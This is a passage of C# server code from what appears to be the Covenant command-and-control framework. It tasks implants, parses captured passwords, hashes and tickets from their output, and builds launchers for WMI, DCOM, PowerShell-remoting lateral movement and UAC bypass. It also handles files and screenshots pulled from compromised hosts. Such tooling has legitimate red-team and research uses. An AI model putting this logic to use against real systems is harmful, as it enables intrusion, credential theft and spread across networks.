            updatingCommand.CommandTime = command.CommandTime;
            updatingCommand.CommandOutput ??= await this.GetCommandOutput(updatingCommand.CommandOutputId);
            if (updatingCommand.CommandOutput.Output != command.CommandOutput.Output)
            {
                updatingCommand.CommandOutput.Output = command.CommandOutput.Output;
                _context.CommandOutputs.Update(updatingCommand.CommandOutput);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditCommandOutput(this, updatingCommand.CommandOutput);

                List<CapturedCredential> capturedCredentials = CapturedCredential.ParseCredentials(updatingCommand.CommandOutput.Output);
                foreach (CapturedCredential cred in capturedCredentials)
                {
                    if (!await this.ContainsCredentials(cred))
                    {
                        await _context.Credentials.AddAsync(cred);
                        await _context.SaveChangesAsync();
                        // _notifier.OnCreateCapturedCredential(this, cred);
                    }
                }
            }
            updatingCommand.GruntTaskingId = command.GruntTaskingId;
            if (updatingCommand.GruntTaskingId > 0)
            {
                updatingCommand.GruntTasking ??= await this.GetGruntTasking(updatingCommand.GruntTaskingId ?? default);
            }
            _context.GruntCommands.Update(updatingCommand);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditGruntCommand(this, updatingCommand);
            return updatingCommand;
        }

        public async Task DeleteGruntCommand(int id)
        {
            GruntCommand command = await this.GetGruntCommand(id);
            _context.GruntCommands.Remove(command);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteGruntCommand(this, command.Id);
        }

        private string GetCommandFromInput(string UserInput, List<ParsedParameter> parameters, GruntTask task = null)
        {
            if (task != null)
            {
                for (int i = 0; i < task.Options.Count; i++)
                {
                    if (!task.Options[i].DisplayInCommand && parameters.Count > (i + 1))
                    {
                        UserInput = UserInput.Replace($@"/{parameters[i + 1].Label}:""{parameters[i + 1].Value}""", "");
                    }
                }
            }
            return UserInput;
        }

        public async Task<string> ParseParametersIntoTask(GruntTask task, List<ParsedParameter> parameters)
        {
            parameters = parameters.Skip(1).ToList();
            if (parameters.Count() < task.Options.Where(O => !O.FileOption).Count(O => !O.Optional))
            {
                this.DisposeContext();
                return ConsoleWriter.PrintFormattedErrorLine(await this.GetUsageForGruntTask(task));
            }
            // All options begin unassigned
            List<bool> OptionAssignments = task.Options.Select(O => false).ToList();
            task.Options.ForEach(O => O.Value = "");
            for (int i = 0; i < parameters.Count; i++)
            {
                if (parameters[i].IsLabeled)
                {
                    var option = task.Options.FirstOrDefault(O => O.Name.Equals(parameters[i].Label, StringComparison.OrdinalIgnoreCase));
                    if (option != null)
                    {
                        option.Value = parameters[i].Value;
                        OptionAssignments[task.Options.IndexOf(option)] = true;
                    }
                }
                else
                {
                    GruntTaskOption nextOption = null;
                    // Find next unassigned option
                    for (int j = 0; j < task.Options.Count; j++)
                    {
                        if (!OptionAssignments[j] && !task.Options[j].FileOption)
                        {
                            nextOption = task.Options[j];
                            OptionAssignments[j] = true;
                            break;
                        }
                    }
                    if (nextOption == null)
                    {
                        // This is an extra parameter
                        return ConsoleWriter.PrintFormattedErrorLine(await this.GetUsageForGruntTask(task));
                    }
                    nextOption.Value = parameters[i].Value;
                }
            }

            // Check for unassigned required options
            for (int i = 0; i < task.Options.Count; i++)
            {
                if (!OptionAssignments[i] && !task.Options[i].Optional)
                {
                    // This is an extra parameter
                    StringBuilder toPrint = new StringBuilder();
                    toPrint.Append(ConsoleWriter.PrintFormattedErrorLine(task.Options[i].Name + " is required."));
                    toPrint.Append(ConsoleWriter.PrintFormattedErrorLine(await this.GetUsageForGruntTask(task)));
                    this.DisposeContext();
                    return toPrint.ToString();
                }
            }
            return null;
        }

        private async Task<string> StartHelpCommand(Grunt grunt, List<ParsedParameter> parameters)
        {
            string Name = "Help";
            if ((parameters.Count() != 1 && parameters.Count() != 2) || !parameters[0].Value.Equals(Name, StringComparison.OrdinalIgnoreCase))
            {
                StringBuilder toPrint1 = new StringBuilder();
                toPrint1.Append(ConsoleWriter.PrintFormattedErrorLine("Usage: Help <task_name>"));
                return toPrint1.ToString();
            }
            StringBuilder toPrint = new StringBuilder();
            foreach (GruntTask t in await this.GetGruntTasks())
            {
                if (!t.CompatibleDotNetVersions.Contains(grunt.DotNetVersion))
                {
                    continue;
                }
                if (parameters.Count() == 1)
                {
                    toPrint.AppendLine($"{t.Name}\t\t{t.Description}");
                }
                else if (parameters.Count() == 2 && t.Name.Equals(parameters[1].Value, StringComparison.CurrentCultureIgnoreCase))
                {
                    string usage = t.Name;
                    t.Options.ForEach(O =>
                    {
                        usage += O.Optional ? $" [ <{O.Name.Replace(" ", "_").ToLower()}> ]" : $" <{O.Name.Replace(" ", "_").ToLower()}>";
                    });
                    string libraries = string.Join(",", t.ReferenceSourceLibraries.Select(RSL => RSL.Name));
                    string assemblies = string.Join(",", t.ReferenceAssemblies.Select(RA => RA.Name));
                    string resources = string.Join(",", t.EmbeddedResources.Select(ER => ER.Name));
                    toPrint.AppendLine($"Name: {t.Name}");
                    toPrint.AppendLine($"Description: {t.Description}");
                    toPrint.AppendLine($"Usage: {usage}");
                    toPrint.AppendLine($"ReferenceSourceLibraries: " + (string.IsNullOrEmpty(libraries) ? "None" : libraries));
                    toPrint.AppendLine($"ReferenceAssemblies: " + (string.IsNullOrEmpty(assemblies) ? "None" : assemblies));
                    toPrint.AppendLine($"EmbeddedResources: " + (string.IsNullOrEmpty(resources) ? "None" : resources));
                    if (!string.IsNullOrEmpty(t.Help))
                    {
                        toPrint.AppendLine($"Help: {t.Help}");
                    }
                    break;
                }
            }
            return toPrint.ToString();
        }

        private async Task<GruntTasking> StartGruntTasking(Grunt grunt, GruntTask task, GruntCommand command)
        {
            return await this.CreateGruntTasking(new GruntTasking
            {
                GruntTaskId = task.Id,
                GruntId = grunt.Id,
                Type = task.TaskingType,
                Status = GruntTaskingStatus.Uninitialized,
                GruntCommandId = command.Id,
                GruntCommand = command
            });
        }
        #endregion

        #region CommandOutput Actions
        public async Task<IEnumerable<CommandOutput>> GetCommandOutputs()
        {
            return await _context.CommandOutputs
                .ToListAsync();
        }

        public async Task<CommandOutput> GetCommandOutput(int commandOutputId)
        {
            CommandOutput output = await _context.CommandOutputs
                .Where(CO => CO.Id == commandOutputId)
                .FirstOrDefaultAsync();
            if (output == null)
            {
                throw new ControllerNotFoundException($"NotFound - CommandOutput with Id: {commandOutputId}");
            }
            return output;
        }

        public async Task<CommandOutput> CreateCommandOutput(CommandOutput output)
        {
            await _context.CommandOutputs.AddAsync(output);
            await _context.SaveChangesAsync();
            await _notifier.NotifyCreateCommandOutput(this, output);
            // _notifier.OnCreateCommandOutput(this, output);
            return output;
        }

        public async Task<IEnumerable<CommandOutput>> CreateCommandOutputs(params CommandOutput[] outputs)
        {
            await _context.CommandOutputs.AddRangeAsync(outputs);
            await _context.SaveChangesAsync();
            return outputs;
        }

        public async Task<CommandOutput> EditCommandOutput(CommandOutput output)
        {
            CommandOutput updatingOutput = await this.GetCommandOutput(output.Id);
            updatingOutput.Output = output.Output;
            _context.CommandOutputs.Update(updatingOutput);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditCommandOutput(this, updatingOutput);
            List<CapturedCredential> capturedCredentials = CapturedCredential.ParseCredentials(updatingOutput.Output);
            foreach (CapturedCredential cred in capturedCredentials)
            {
                if (!await this.ContainsCredentials(cred))
                {
                    await _context.Credentials.AddAsync(cred);
                    await _context.SaveChangesAsync();
                    // _notifier.OnCreateCapturedCredential(this, cred);
                }
            }
            return updatingOutput;
        }

        public async Task DeleteCommandOutput(int id)
        {
            CommandOutput output = await this.GetCommandOutput(id);
            _context.CommandOutputs.Remove(output);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteCommandOutput(this, output.Id);
        }
        #endregion

        #region GruntTasking Actions
        public async Task<IEnumerable<GruntTasking>> GetGruntTaskings()
        {
            return await _context.GruntTaskings
                .Include(GT => GT.Grunt)
                .Include(GT => GT.GruntTask)
                .Include(GT => GT.GruntCommand)
                    .ThenInclude(GC => GC.User)
                .ToListAsync();
        }

        public async Task<IEnumerable<GruntTasking>> GetGruntTaskingsForGrunt(int gruntId)
        {
            return await _context.GruntTaskings
                .Where(GT => GT.GruntId == gruntId)
                .Include(GT => GT.Grunt)
                .Include(GT => GT.GruntTask)
                .Include(GT => GT.GruntCommand)
                    .ThenInclude(GC => GC.User)
                .ToListAsync();
        }

        public async Task<IEnumerable<GruntTasking>> GetUninitializedGruntTaskingsForGrunt(int gruntId)
        {
            return await _context.GruntTaskings
                .Where(GT => GT.GruntId == gruntId && GT.Status == GruntTaskingStatus.Uninitialized)
                .Include(GT => GT.Grunt)
                .Include(GT => GT.GruntTask)
                .Include(GT => GT.GruntCommand)
                    .ThenInclude(GC => GC.User)
                .ToListAsync();
        }

        public async Task<IEnumerable<GruntTasking>> GetGruntTaskingsSearch(int gruntId)
        {
            List<GruntTasking> search = new List<GruntTasking>();
            foreach (GruntTasking task in await this.GetGruntTaskings())
            {
                if (await this.IsChildGrunt(gruntId, task.GruntId))
                {
                    search.Add(task);
                }
            }
            return search;
        }

        public async Task<GruntTasking> GetGruntTasking(int taskingId)
        {
            GruntTasking tasking = await _context.GruntTaskings
                .Where(GT => GT.Id == taskingId)
                .Include(GT => GT.Grunt)
                .Include(GT => GT.GruntTask)
                .Include(GC => GC.GruntCommand)
                    .ThenInclude(GC => GC.User)
                .FirstOrDefaultAsync();
            if (tasking == null)
            {
                throw new ControllerNotFoundException($"NotFound - GruntTasking with id: {taskingId}");
            }
            return tasking;
        }

        public async Task<GruntTasking> GetGruntTaskingByName(string taskingName)
        {
            GruntTasking tasking = await _context.GruntTaskings
                .Where(GT => GT.Name == taskingName)
                .Include(GT => GT.Grunt)
                .Include(GT => GT.GruntTask)
                .Include(GT => GT.GruntCommand)
                    .ThenInclude(GC => GC.User)
                .FirstOrDefaultAsync();
            if (tasking == null)
            {
                throw new ControllerNotFoundException($"NotFound - GruntTasking with Name: {taskingName}");
            }
            return tasking;
        }

        public async Task<GruntTasking> CreateGruntTasking(GruntTasking tasking)
        {
            tasking.Grunt = await this.GetGrunt(tasking.GruntId);
            tasking.Grunt.Listener = await this.GetListener(tasking.Grunt.ListenerId);
            tasking.GruntTask = await this.GetGruntTask(tasking.GruntTaskId);
            tasking.GruntCommand = await this.GetGruntCommand(tasking.GruntCommandId);
            tasking.GruntCommand.CommandOutput ??= await this.GetCommandOutput(tasking.GruntCommand.CommandOutputId);
            List<string> parameters = tasking.GruntTask.Options.OrderBy(O => O.Id).Select(O => string.IsNullOrEmpty(O.Value) ? O.DefaultValue : O.Value).ToList();
            if (tasking.GruntTask.Name.Equals("powershell", StringComparison.OrdinalIgnoreCase) && !string.IsNullOrWhiteSpace(tasking.Grunt.PowerShellImport))
            {
                parameters[0] = Common.CovenantEncoding.GetString(Convert.FromBase64String(tasking.Grunt.PowerShellImport)) + "\r\n" + parameters[0];
            }
            else if (tasking.GruntTask.Name.Equals("powershellimport", StringComparison.OrdinalIgnoreCase))
            {
                if (parameters.Count >= 1)
                {
                    string import = parameters[0];
                    byte[] importBytes = Convert.FromBase64String(import);
                    if (importBytes.Length >= 3 && importBytes[0] == 0xEF && importBytes[1] == 0xBB && importBytes[2] == 0xBF)
                    {
                        import = Convert.ToBase64String(importBytes.Skip(3).ToArray());
                    }
                    tasking.Grunt.PowerShellImport = import;
                }
                else
                {
                    tasking.Grunt.PowerShellImport = "";
                }
                _context.Grunts.Update(tasking.Grunt);
                tasking.GruntCommand.CommandOutput.Output = "PowerShell Imported";

                _context.GruntCommands.Update(tasking.GruntCommand);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditGrunt(this, tasking.Grunt);
                await _notifier.NotifyEditGruntCommand(this, tasking.GruntCommand);
                tasking.Status = GruntTaskingStatus.Completed;
            }
            else if (tasking.GruntTask.Name.Equals("wmigrunt", StringComparison.OrdinalIgnoreCase))
            {
                Launcher l = await _context.Launchers.FirstOrDefaultAsync(L => L.Name.ToLower() == parameters[1].ToLower());
                if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                {
                    throw new ControllerNotFoundException($"NotFound - Launcher with name: {parameters[1]}");
                }

                // Add .exe extension if needed
                List<string> split = l.LauncherString.Split(" ").ToList();
                parameters[1] = split.FirstOrDefault();
                if (!parameters[1].EndsWith(".exe", StringComparison.OrdinalIgnoreCase)) { parameters[1] += ".exe"; }

                // Add Directory
                string Directory = "C:\\Windows\\System32\\";
                if (parameters[1].Equals("powershell.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "WindowsPowerShell\\v1.0\\"; }
                else if (parameters[1].Equals("wmic.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "wbem\\"; }
                if (!parameters[1].StartsWith("C:\\", StringComparison.OrdinalIgnoreCase)) { parameters[1] = Directory + parameters[1]; }
                if (split.Count > 1) { parameters[1] += " " + String.Join(" ", split.Skip(1).ToArray()); }
            }
            else if (tasking.GruntTask.Name.Equals("dcomgrunt", StringComparison.OrdinalIgnoreCase))
            {
                Launcher l = await _context.Launchers.FirstOrDefaultAsync(L => L.Name.ToLower() == parameters[1].ToLower());
                if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                {
                    throw new ControllerNotFoundException($"NotFound - Launcher with name: {parameters[1]}");
                }
                // Add .exe extension if needed
                List<string> split = l.LauncherString.Split(" ").ToList();
                parameters[1] = split.FirstOrDefault();
                if (!parameters[1].EndsWith(".exe", StringComparison.OrdinalIgnoreCase)) { parameters[1] += ".exe"; }

                // Add command parameters
                split.RemoveAt(0);
                parameters.Insert(2, String.Join(" ", split.ToArray()));

                // Add Directory
                string Directory = "C:\\Windows\\System32\\";
                if (parameters[1].Equals("powershell.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "WindowsPowerShell\\v1.0\\"; }
                else if (parameters[1].Equals("wmic.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "wbem\\"; }
                if (!parameters[1].StartsWith("C:\\", StringComparison.OrdinalIgnoreCase)) { parameters[1] = Directory + parameters[1]; }

                parameters.Insert(3, Directory);
            }
            else if (tasking.GruntTask.Name.Equals("powershellremotinggrunt", StringComparison.OrdinalIgnoreCase))
            {
                Launcher l = await _context.Launchers.FirstOrDefaultAsync(L => L.Name.ToLower() == parameters[1].ToLower());
                if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                {
                    throw new ControllerNotFoundException($"NotFound - Launcher with name: {parameters[1]}");
                }
                // Add .exe extension if needed
                List<string> split = l.LauncherString.Split(" ").ToList();
                parameters[1] = split.FirstOrDefault();
                if (!parameters[1].EndsWith(".exe", StringComparison.OrdinalIgnoreCase)) { parameters[1] += ".exe"; }
                // Add Directory
                string Directory = "C:\\Windows\\System32\\";
                if (parameters[1].Equals("powershell.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "WindowsPowerShell\\v1.0\\"; }
                else if (parameters[1].Equals("wmic.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "wbem\\"; }
                if (!parameters[1].StartsWith("C:\\", StringComparison.OrdinalIgnoreCase)) { parameters[1] = Directory + parameters[1]; }
                parameters[1] = parameters[1] + " " + string.Join(" ", split.Skip(1).ToList());
            }
            else if (tasking.GruntTask.Name.Equals("bypassuacgrunt", StringComparison.OrdinalIgnoreCase))
            {
                Launcher l = await _context.Launchers.FirstOrDefaultAsync(L => L.Name.ToLower() == parameters[0].ToLower());
                if (l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                {
                    throw new ControllerNotFoundException($"NotFound - Launcher with name: {parameters[0]}");
                }
                // Add .exe extension if needed
                string[] split = l.LauncherString.Split(" ");
                parameters[0] = split.FirstOrDefault();
                if (!parameters[0].EndsWith(".exe", StringComparison.OrdinalIgnoreCase)) { parameters[0] += ".exe"; }

                // Add parameters need for BypassUAC Task
                string ArgParams = String.Join(" ", split.ToList().GetRange(1, split.Count() - 1));
                string Directory = "C:\\Windows\\System32\\";
                if (parameters[0].Equals("powershell.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "WindowsPowerShell\\v1.0\\"; }
                else if (parameters[0].Equals("wmic.exe", StringComparison.OrdinalIgnoreCase)) { Directory += "wbem\\"; }

                parameters.Add(ArgParams);
                parameters.Add(Directory);
                parameters.Add("0");
            }
            else if (tasking.GruntTask.Name.Equals("SharpShell", StringComparison.CurrentCultureIgnoreCase))
            {
                string WrapperFunctionFormat =
    @"using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Security;
using System.Security.Principal;
using System.Collections.Generic;
using SharpSploit.Credentials;
using SharpSploit.Enumeration;
using SharpSploit.Execution;
using SharpSploit.Generic;
using SharpSploit.Misc;
using SharpSploit.LateralMovement;

public static class Task
{{
    public static string Execute()
    {{
        {0}
    }}
}}";
                string csharpcode = string.Join(" ", parameters);
                tasking.GruntTask.Code = string.Format(WrapperFunctionFormat, csharpcode);
                tasking.GruntTask.Compiled = false;
                _context.GruntTasks.Update(tasking.GruntTask);
                await _context.SaveChangesAsync();
                parameters = new List<string> { };
            }
            else if (tasking.GruntTask.Name.Equals("Disconnect", StringComparison.CurrentCultureIgnoreCase))
            {
                Grunt g = await this.GetGruntByName(parameters[0]);
                parameters[0] = g.GUID;
            }
            else if (tasking.GruntTask.Name.Equals("Connect", StringComparison.CurrentCultureIgnoreCase))
            {
                parameters[0] = parameters[0] == "localhost" ? tasking.Grunt.Hostname : parameters[0];
                parameters[0] = parameters[0] == "127.0.0.1" ? tasking.Grunt.IPAddress : parameters[0];
            }
            tasking.Parameters = parameters;
            try
            {
                tasking.GruntTask.Compile(tasking.Grunt.ImplantTemplate, tasking.Grunt.RuntimeIdentifier);
            }
            catch (CompilerException e)
            {
                tasking.GruntCommand.CommandOutput.Output = "CompilerException: " + e.Message;
                tasking.Status = GruntTaskingStatus.Aborted;
                _context.GruntCommands.Update(tasking.GruntCommand);
                await _context.SaveChangesAsync();
                await _notifier.NotifyEditGruntCommand(this, tasking.GruntCommand);
            }
            await _context.GruntTaskings.AddAsync(tasking);
            await _context.SaveChangesAsync();
            tasking.GruntCommand.GruntTaskingId = tasking.Id;
            tasking.GruntCommand.GruntTasking = tasking;
            await this.EditGruntCommand(tasking.GruntCommand);
            Grunt parent = (await this.GetParentGrunt(tasking.Grunt)) ?? tasking.Grunt;
            parent.Listener = await this.GetListener(parent.ListenerId);
            await _notifier.NotifyCreateGruntTasking(this, tasking);
            await _notifier.NotifyNotifyListener(this, parent);
            return tasking;
        }

        public async Task<IEnumerable<GruntTasking>> CreateGruntTaskings(params GruntTasking[] taskings)
        {
            await _context.GruntTaskings.AddRangeAsync(taskings);
            await _context.SaveChangesAsync();
            return taskings;
        }

        public async Task<GruntTasking> EditGruntTasking(GruntTasking tasking)
        {
            Grunt grunt = await this.GetGrunt(tasking.GruntId);
            GruntTasking updatingGruntTasking = await _context.GruntTaskings
                .Where(GT => GT.Id == tasking.Id)
                .Include(GT => GT.GruntTask)
                .Include(GT => GT.GruntCommand)
                    .ThenInclude(GC => GC.CommandOutput)
                .Include(GT => GT.GruntCommand)
                    .ThenInclude(GC => GC.User)
                .FirstOrDefaultAsync();
            if (updatingGruntTasking == null)
            {
                throw new ControllerNotFoundException($"NotFound - GruntTasking with id: {tasking.Id}");
            }

            GruntTaskingStatus newStatus = tasking.Status;
            GruntTaskingStatus originalStatus = updatingGruntTasking.Status;
            if ((originalStatus == GruntTaskingStatus.Tasked || originalStatus == GruntTaskingStatus.Progressed) &&
                (newStatus == GruntTaskingStatus.Progressed || newStatus == GruntTaskingStatus.Completed))
            {
                if (tasking.Type == GruntTaskingType.Exit)
                {
                    grunt.Status = GruntStatus.Exited;
                }
                else if ((tasking.Type == GruntTaskingType.SetDelay || tasking.Type == GruntTaskingType.SetJitter ||
                    tasking.Type == GruntTaskingType.SetConnectAttempts) && tasking.Parameters.Count >= 1 && int.TryParse(tasking.Parameters[0], out int n))
                {
                    if (tasking.Type == GruntTaskingType.SetDelay)
                    {
                        grunt.Delay = n;
                    }
                    else if (tasking.Type == GruntTaskingType.SetJitter)
                    {
                        grunt.JitterPercent = n;
                    }
                    else if (tasking.Type == GruntTaskingType.SetConnectAttempts)
                    {
                        grunt.ConnectAttempts = n;
                    }
                    _context.Grunts.Update(grunt);
                    await _notifier.NotifyEditGrunt(this, grunt);
                }
                else if (tasking.Type == GruntTaskingType.SetKillDate && tasking.Parameters.Count >= 1 && DateTime.TryParse(tasking.Parameters[0], out DateTime date))
                {
                    grunt.KillDate = date;
                    _context.Grunts.Update(grunt);
                    await _notifier.NotifyEditGrunt(this, grunt);
                }
                else if (tasking.Type == GruntTaskingType.Connect)
                {
                    // Check if this Grunt was already connected
                    string hostname = tasking.Parameters[0];
                    string pipename = tasking.Parameters[1];
                    Grunt connectedGrunt = tasking.Parameters.Count >= 3 ? await this.GetGruntByGUID(tasking.Parameters[2]) :
                        await _context.Grunts.Where(G =>
                            G.Status != GruntStatus.Exited &&
                            G.ImplantTemplate.CommType == CommunicationType.SMB &&
                            ((G.IPAddress == hostname || G.Hostname == hostname) || (G.IPAddress == "" && G.Hostname == "")) &&
                            G.SMBPipeName == pipename
                        ).OrderByDescending(G => G.ActivationTime)
                        .Include(G => G.ImplantTemplate)
                        .FirstOrDefaultAsync();
                    if (connectedGrunt == null)
                    {
                        throw new ControllerNotFoundException($"NotFound - Grunt staging from {hostname}:{pipename}");
                    }
                    else
                    {
                        Grunt connectedGruntParent = _context.Grunts.AsEnumerable().FirstOrDefault(G => G.Children.Contains(connectedGrunt.GUID));
                        if (connectedGruntParent != null)
                        {
                            connectedGruntParent.RemoveChild(connectedGrunt);
                            _context.Grunts.Update(connectedGruntParent);
                            // Connect to tasked Grunt, no need to "Progress", as Grunt is already staged
                            grunt.AddChild(connectedGrunt);
                            connectedGrunt.Status = GruntStatus.Active;
                            _context.Grunts.Update(connectedGrunt);
                            await _notifier.NotifyEditGrunt(this, connectedGrunt);
                        }
                        else
                        {
                            grunt.AddChild(connectedGrunt);
                            if (connectedGrunt.Status == GruntStatus.Disconnected)
                            {
                                connectedGrunt.Status = GruntStatus.Active;
                                _context.Grunts.Update(connectedGrunt);
                                await _notifier.NotifyEditGrunt(this, connectedGrunt);
                            }
                        }
                        await _context.Grunts.Where(G =>
                            G.GUID != connectedGrunt.GUID && G.GUID != grunt.GUID &&
                            G.Status != GruntStatus.Exited &&
                            G.ImplantTemplate.CommType == CommunicationType.SMB &&
                            ((G.IPAddress == hostname || G.Hostname == hostname) || (G.IPAddress == "" && G.Hostname == "")) &&
                            G.SMBPipeName == pipename
                        ).ForEachAsync(G =>
                        {
                            G.Status = GruntStatus.Exited;
                            _context.Update(G);
                            _notifier.NotifyEditGrunt(this, G).Wait();
                        });
                    }
                }
                else if (tasking.Type == GruntTaskingType.Disconnect)
                {
                    Grunt disconnectFromGrunt = await this.GetGruntByGUID(tasking.Parameters[0]);
                    disconnectFromGrunt.Status = GruntStatus.Disconnected;
                    _context.Grunts.Update(disconnectFromGrunt);
                    await _notifier.NotifyEditGrunt(this, disconnectFromGrunt);
                    grunt.RemoveChild(disconnectFromGrunt);
                    _context.Grunts.Update(grunt);
                    await _notifier.NotifyEditGrunt(this, grunt);
                }
            }
            Event ev = null;
            if ((newStatus == GruntTaskingStatus.Completed || newStatus == GruntTaskingStatus.Progressed) && originalStatus != newStatus)
            {
                if (newStatus == GruntTaskingStatus.Completed)
                {
                    updatingGruntTasking.CompletionTime = DateTime.UtcNow;
                }
                string verb = newStatus == GruntTaskingStatus.Completed ? "completed" : "progressed";
                GruntTask DownloadTask = null;
                GruntTask ScreenshotTask = null;
                try
                {
                    DownloadTask = await this.GetGruntTaskByName("Download", grunt.DotNetVersion);
                    ScreenshotTask = await this.GetGruntTaskByName("ScreenShot", grunt.DotNetVersion);
                }
                catch (ControllerNotFoundException) { }

                if (DownloadTask != null && tasking.GruntTaskId == DownloadTask.Id && newStatus == GruntTaskingStatus.Completed)
                {
                    string FileName = tasking.Parameters[0];
                    DownloadEvent downloadEvent = new DownloadEvent
                    {
                        Time = updatingGruntTasking.CompletionTime,
                        MessageHeader = "Download Completed",
                        MessageBody = "Downloaded: " + FileName,
                        Level = EventLevel.Info,
                        Context = grunt.Name,
                        FileName = FileName,
                        FileContents = updatingGruntTasking.GruntCommand.CommandOutput.Output,
                        Progress = DownloadEvent.DownloadProgress.Complete
                    };
                    downloadEvent.WriteToDisk();
                    await _context.Events.AddAsync(downloadEvent);
                    await _notifier.NotifyCreateEvent(this, downloadEvent);
                }
                else if (ScreenshotTask != null && tasking.GruntTaskId == ScreenshotTask.Id && newStatus == GruntTaskingStatus.Completed)
                {
                    string FileName = tasking.Name + ".png";
                    ScreenshotEvent screenshotEvent = new ScreenshotEvent
                    {
                        Time = updatingGruntTasking.CompletionTime,
                        MessageHeader = "Download ScreenShot Completed",
                        MessageBody = "Downloaded screenshot: " + FileName,
                        Level = EventLevel.Info,
                        Context = grunt.Name,
                        FileName = FileName,
                        FileContents = updatingGruntTasking.GruntCommand.CommandOutput.Output,
                        Progress = DownloadEvent.DownloadProgress.Complete
                    };
                    screenshotEvent.WriteToDisk();
                    await _context.Events.AddAsync(screenshotEvent);
                    await _notifier.NotifyCreateEvent(this, screenshotEvent);
                }
            }
            updatingGruntTasking.TaskingTime = tasking.TaskingTime;
            updatingGruntTasking.Status = newStatus;
            _context.Grunts.Update(grunt);
            _context.GruntTaskings.Update(updatingGruntTasking);
            await _context.SaveChangesAsync();
            await _notifier.NotifyEditGrunt(this, grunt);
            await _notifier.NotifyEditGruntTasking(this, updatingGruntTasking);
            if (ev != null)
            {
                tasking.GruntCommand = await _context.GruntCommands
                    .Where(GC => GC.Id == tasking.GruntCommandId)
                    .Include(GC => GC.User)
                    .Include(GC => GC.CommandOutput)
                    .Include(GC => GC.GruntTasking)
                        .ThenInclude(GC => GC.GruntTask)
                    .FirstOrDefaultAsync();
                await _notifier.NotifyEditGruntCommand(this, tasking.GruntCommand);
            }
            return await this.GetGruntTasking(updatingGruntTasking.Id);
        }

        public async Task DeleteGruntTasking(int taskingId)
        {
            GruntTasking removingGruntTasking = await _context.GruntTaskings.FirstOrDefaultAsync(GT => GT.Id == taskingId);
            if (removingGruntTasking == null)
            {
                throw new ControllerNotFoundException($"NotFound - GruntTasking with id: {taskingId}");
            }
            _context.GruntTaskings.Remove(removingGruntTasking);
            await _context.SaveChangesAsync();
            // _notifier.OnDeleteGruntTasking(this, removingGruntTasking.Id);
        }

        private async Task<Grunt> GetParentGrunt(Grunt child)
        {
            // var parent = child.ImplantTemplate.CommType != CommunicationType.SMB ? child : await _context.Grunts.Include(G => G.ImplantTemplate).FirstOrDefaultAsync(G => G.Children.Contains(child.GUID));
            Grunt parent;
            if (child.ImplantTemplate.CommType != CommunicationType.SMB)
            {
                parent = child;
            }
            else
            {
                List<Grunt> grunts = await _context.Grunts.Include(G => G.ImplantTemplate).ToListAsync();
                parent = grunts.FirstOrDefault(G => G.Children.Contains(child.GUID));
            }
            if (parent != null && parent.ImplantTemplate.CommType == CommunicationType.SMB)
            {
                return await GetParentGrunt(parent);
            }
            return parent;
        }

        private async Task<bool> IsChildGrunt(int ParentId, int ChildId)
        {
            if (ParentId == ChildId)
            {
                return true;
            }
            Grunt parentGrunt = await _context.Grunts.FirstOrDefaultAsync(G => G.Id == ParentId);
            Grunt childGrunt = await _context.Grunts.FirstOrDefaultAsync(G => G.Id == ChildId);
            if (parentGrunt == null || childGrunt == null)
            {
                return false;
            }
            if (parentGrunt.Children.Contains(childGrunt.GUID))
            {
                return true;
            }
            foreach (string child in parentGrunt.Children)
            {
                Grunt directChild = await _context.Grunts.FirstOrDefaultAsync(G => G.GUID == child);
                if (directChild != null && await IsChildGrunt(directChild.Id, ChildId))
                {
                    return true;
                }
            }
            return false;
        }

        private async Task<bool> ContainsCredentials(CapturedCredential cred)
        {
            switch (cred.Type)
            {
                case CredentialType.Password:
                    CapturedPasswordCredential passcred = (CapturedPasswordCredential)cred;
                    return (await _context.Credentials.Where(C => C.Type == CredentialType.Password)
                                   .Select(C => (CapturedPasswordCredential)C)
                                   .FirstOrDefaultAsync(PC =>
                                       PC.Type == passcred.Type &&
                                       PC.Domain == passcred.Domain &&
                                       PC.Username == passcred.Username &&
                                       PC.Password == passcred.Password
                           )) != null;
                case CredentialType.Hash:
                    CapturedHashCredential hashcred = (CapturedHashCredential)cred;
                    return (await _context.Credentials.Where(C => C.Type == CredentialType.Hash)
                                   .Select(C => (CapturedHashCredential)C)
                                   .FirstOrDefaultAsync(PC =>
                                       PC.Type == hashcred.Type &&
                                       PC.Domain == hashcred.Domain &&
                                       PC.Username == hashcred.Username &&
                                       PC.Hash == hashcred.Hash &&
                                       PC.HashCredentialType == hashcred.HashCredentialType
                           )) != null;
                case CredentialType.Ticket:
                    CapturedTicketCredential ticketcred = (CapturedTicketCredential)cred;
                    return (await _context.Credentials.Where(C => C.Type == CredentialType.Ticket)
                                   .Select(C => (CapturedTicketCredential)C)
                                   .FirstOrDefaultAsync(PC =>
                                       PC.Type == ticketcred.Type &&
                                       PC.Domain == ticketcred.Domain &&
                                       PC.Username == ticketcred.Username &&
                                       PC.Ticket == ticketcred.Ticket &&
                                       PC.TicketCredentialType == ticketcred.TicketCredentialType
                           )) != null;
                default:
                    return (await _context.Credentials.FirstOrDefaultAsync(P =>
                                       P.Type == cred.Type &&
                                       P.Domain == cred.Domain &&
                                       P.Username == cred.Username
                           )) != null;
            }
        }
        #endregion

        #region Credentials Actions
        public async Task<IEnumerable<CapturedCredential>> GetCredentials()
        {
            return await _context.Credentials.ToListAsync();
        }

        public async Task<IEnumerable<CapturedPasswordCredential>> GetPasswordCredentials()
        {
            return await _context.Credentials.Where(P => P.Type == CredentialType.Password).Select(P => (CapturedPasswordCredential)P).ToListAsync();
        }

        public async Task<IEnumerable<CapturedHashCredential>> GetHashCredentials()
        {
